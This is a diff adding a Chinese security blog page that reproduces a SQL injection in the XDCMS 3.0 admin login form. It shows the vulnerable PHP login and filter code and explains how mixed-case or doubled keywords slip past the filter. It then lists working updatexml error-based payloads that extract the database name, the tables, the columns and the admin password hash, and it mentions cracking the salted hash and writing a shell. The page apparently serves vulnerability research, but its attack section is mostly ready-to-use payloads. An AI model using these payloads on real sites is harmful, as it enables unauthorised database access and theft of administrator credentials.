@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XDCMS 3.0 后台登录窗sql注入漏洞一、漏洞简介二、漏洞影响XDCMS 3.0 三、复现过程漏洞链 system&#x2F;modules&#x2F;xdcms&#x2F;login.php public function check()&amp;#123;                  $username &#x3D; safe_html($_POST[&#39;username&#39;]);         $password">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/XDCMS/XDCMS%203.0%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%AA%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="XDCMS 3.0 后台登录窗sql注入漏洞一、漏洞简介二、漏洞影响XDCMS 3.0 三、复现过程漏洞链 system&#x2F;modules&#x2F;xdcms&#x2F;login.php public function check()&amp;#123;                  $username &#x3D; safe_html($_POST[&#39;username&#39;]);         $password">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/XDCMS3.0%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%AA%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.jpg">
+<meta property="article:published_time" content="2022-07-08T06:26:08.052Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.399Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/XDCMS3.0%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%AA%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.jpg">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-XDCMS/XDCMS 3.0 后台登录窗sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/XDCMS/XDCMS%203.0%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%AA%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.052Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XDCMS-3-0-后台登录窗sql注入漏洞"><a href="#XDCMS-3-0-后台登录窗sql注入漏洞" class="headerlink" title="XDCMS 3.0 后台登录窗sql注入漏洞"></a>XDCMS 3.0 后台登录窗sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>XDCMS 3.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞链</p>
+<pre><code>system/modules/xdcms/login.php
+public function check()&#123;
+        
+        $username = safe_html($_POST[&#39;username&#39;]);
+        $password = safe_html($_POST[&#39;password&#39;]);
+        $verifycode = safe_html($_POST[&#39;verifycode&#39;]);
+
+        if(empty($username)||empty($password))&#123;
+            showmsg(C(&#39;user_pass_empty&#39;),&#39;-1&#39;);
+        &#125;
+        
+        if($verifycode!=$_SESSION[&#39;code&#39;])&#123;
+            showmsg(C(&#39;verifycode_error&#39;),&#39;-1&#39;);
+        &#125;
+        
+        $sql=&quot;select * from &quot;.DB_PRE.&quot;admin where `username`=&#39;$username&#39;&quot;;
+        if($this-&gt;mysql-&gt;num_rows($sql)==0)&#123;
+            showmsg(C(&#39;user_not_exist&#39;),&#39;-1&#39;);
+        &#125;
+        
+        $rs=$this-&gt;mysql-&gt;get_one($sql);
+        $password=password($password,$rs[&#39;encrypt&#39;]);
+        if($password!=$rs[&#39;password&#39;])&#123;
+            showmsg(C(&#39;password_error&#39;),&#39;-1&#39;);
+        &#125;
+        
+        if($rs[&#39;is_lock&#39;]==1)&#123;
+            showmsg(C(&#39;user_lock&#39;),&#39;-1&#39;);
+        &#125;
+        
+        $logins=$rs[&quot;logins&quot;]+1;
+        $ip=safe_replace(safe_html(getip()));
+        $this-&gt;mysql-&gt;db_update(&quot;admin&quot;,&quot;`last_ip`=&#39;&quot;.$ip.&quot;&#39;,`last_time`=&quot;.datetime().&quot;,`logins`=&quot;.$logins,&quot;`username`=&#39;$username&#39;&quot;);
+        
+        $_SESSION[&#39;admin&#39;]=$rs[&#39;username&#39;];
+        $_SESSION[&#39;admin_id&#39;]=$rs[&#39;id&#39;];
+        $_SESSION[&#39;groupid&#39;]=$rs[&#39;groupid&#39;];
+        unset($rs);
+        showmsg(C(&quot;login_success&quot;),&quot;index.php?m=xdcms&amp;c=index&quot;);
+    &#125;
+safe_html()
+function safe_html($str)&#123;
+    if(empty($str))&#123;return;&#125;
+    $str=preg_replace(&#39;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file
+|outfile/&#39;,&#39;&#39;,$str);
+    return htmlspecialchars($str);
+&#125;
+</code></pre>
+<p>safe_html()使用preg_replace()时候，pattern未添加/i修饰符，导致过滤字符可通过大小写转换或双写进行绕过；</p>
+<p>同时，htmlspecialchars()未添加参数，默认仅对双引号进行转义</p>
+<p><strong>payload</strong></p>
+<pre><code>#爆库
+username=admin%27+OR+UPDATExml(1,concat(&#39;~&#39;,(database())),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=
+#爆表名
+username=admin%27+OR+UPDATExml(1,concat(&#39;~&#39;,(SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+&#39;xdcms&#39;)),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=
+//updatexml一次显示32位字符，需要偏转
+username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+&#39;xdcms&#39;),30,30)),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=
+#爆表名
+username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(column_name)+frOm+information_scheMA.columns+whEre+table_name+like+&#39;c_admin&#39;),1,32)),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=
+#爆内容
+username=admin%27+OR+UPDATExml(1,concat(0x7e,(selEct+password+From+c_admin)),0)--+&amp;password=123&amp;verifycode=3bdd&amp;button=
+</code></pre>
+<p><img src="/resource/XDCMS3.0%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%AA%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.jpg"></p>
+<p>虽然获取密码hash值，但cms并未直接通过MD5获得哈希值，且无法破解该哈希值；</p>
+<p>通过SQL注入获取到账户encrypt，再使用密码字典，依次爆破来猜测明文密码；另外可通过数据库写shell，但此时<code>secure_file_priv</code>被禁用</p>
+<pre><code>function password($password, $encrypt=&#39;&#39;) &#123;
+    $pwd = array();
+    $pwd[&#39;encrypt&#39;] =  $encrypt ? $encrypt : get_random();
+    $password_md5=md5(trim($password));
+    $nums=strlen($password_md5) - strlen($pwd[&#39;encrypt&#39;]);//encrypt:lr24vx2
+    $pwd[&#39;password&#39;] = md5(substr_replace($password_md5,$pwd[&#39;encrypt&#39;],$nums));
+    return $encrypt ? $pwd[&#39;password&#39;] : $pwd;
+&#125;
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/XDCMS/XDCMS%203.0%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%AA%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qyqp00muy8v1eh2y91v8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/XDCMS/XDCMS%203.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%A0%E9%99%A4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/XDCMS/XDCMS%203.0%20%E5%90%8E%E5%8F%B0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5sql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
